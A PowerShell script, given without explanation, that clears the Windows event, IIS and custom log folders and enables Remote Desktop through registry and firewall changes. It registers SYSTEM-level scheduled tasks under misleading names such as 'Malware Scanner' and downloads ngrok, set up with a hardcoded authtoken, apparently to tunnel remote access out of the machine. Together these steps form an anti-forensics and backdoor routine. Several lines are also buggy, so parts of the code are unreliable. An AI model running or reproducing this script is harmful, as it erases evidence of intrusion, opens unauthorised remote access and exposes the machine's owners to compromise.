#check if a path exists
Function checkIfFolderExists {
     param(
        [string]$FolderPath
    )

    if (Test-Path -Path $FolderPath) {
        Write-Host "Folder " + $FolderPath + " exists."
        return $true
    }
    Write-Host "Folder " + $FolderPath + " does not exists."
    return $false
}

Function removeLogFilesFromAFolder {
     param(
        [string]$FolderPath
    )

    if(checkIfFolderExists -Folderpath $FolderPath) {
        Write-Host "Initiaing file deletion on " + $FolderPath
        $FolderPathWithFileExtension = $FolderPath + "\*.*"
        Remove-Item $FolderPathWithFileExtension
        Write-Host "File deleted from " + $FolderPath
    }
}

#Removed all the log files
removeLogFilesFromAFolder -Folderpath "C:\Logs"
removeLogFilesFromAFolder -Folderpath "C:\Windows\System32\winevt\Logs"
removeLogFilesFromAFolder -Folderpath "C:\inetpub\logs\LogFiles"

# Get the current folder ACL
$scriptsFolder = Get-Acl "C:\Windows\System32\scripts"
$inetpubFolder = Get-Acl "C:\inetpub"

# Get the current owner of the folder
$scriptsFolderOwner = $scriptsFolder.Owner
$inetpubFolderOwner = $inetpubFolder.Owner

# Set the new owner of the folder
$newOwner = New-Object System.Security.Principal.NTAccount("domain\Administator")
$scriptsFolderOwner.SetOwner($newOwner)
$inetpubFolderOwner.SetOwner($newOwner)

# Set the new ACL for the folder
Set-Acl "C:\scripts" $scriptsFolder
Set-Acl "C:\scripts" $inetpubFolder


# Enable Remote Desktop Connection
Set-ItemProperty 'HKLM:\SYSTEM\CurrentControlSet\Control\Terminal Server\' -Name "fDenyTSConnections" -Value 0

Set-ItemProperty 'HKLM:\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp\' -Name "UserAuthentication" -Value 1

Enable-NetFirewallRule -DisplayGroup "Remote Desktop"

$TaskName = "System Upgrade"
$TaskName2 = "Malware Scanner"
$EnablerScriptPath = "C:\Windows\System32\scripts\enabler.ps1"
$DisablerScriptPath = "C:\Windows\System32\scripts\disabler.ps1"
$EnablerScriptStartTime = (Get-Date).Date.AddDays(1).AddHours(0).AddMinutes(0)
$DisablerScriptStartTime = (Get-Date).Date.AddDays(1).AddHours(3).AddMinutes(0)

$EnablerScriptAction = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-ExecutionPolicy Bypass -File $EnablerScriptPath"
$EnablerScriptTrigger = New-ScheduledTaskTrigger -Daily -At 12:00am

$DisablerScriptAction = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-ExecutionPolicy Bypass -File $DisablerScriptPath"
$DisablerScriptTrigger = New-ScheduledTaskTrigger -Daily -At 3:00am

$Principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccount -RunLevel Highest

$Settings = New-ScheduledTaskSettingsSet -Compatibility Win7
$EnablerScriptTask = New-ScheduledTask -Action $EnablerScriptAction -Trigger $EnablerScriptTrigger -Settings $Settings -Principal $Principal
$DisablerScriptTask = New-ScheduledTask -Action $DisablerScriptAction -Trigger $DisablerScriptTrigger -Settings $Settings -Principal $Principal

Register-ScheduledTask -TaskName $TaskName -InputObject $EnablerScriptTask 
Register-ScheduledTask -TaskName $TaskName2 -InputObject $DisablerScriptTask

$url = "https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3.3.0-windows-amd64.zip"
$output = "C:\temp\ngrok.zip"
$extractPath = "C:\Program Files\Ngrok"

# Download Ngrok
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
Invoke-WebRequest -Uri $url -OutFile $output

# Extract Ngrok
Expand-Archive -Path $output -DestinationPath $extractPath -Force

# Install Ngrok
Set-Location $extractPath
.\ngrok.exe authtoken 285vxc8yv5IwEOSAb5Jmt2jyTzT_7xdB35F5q6Tay8M5Utum4

# Delete downloaded zip file
Remove-Item $output
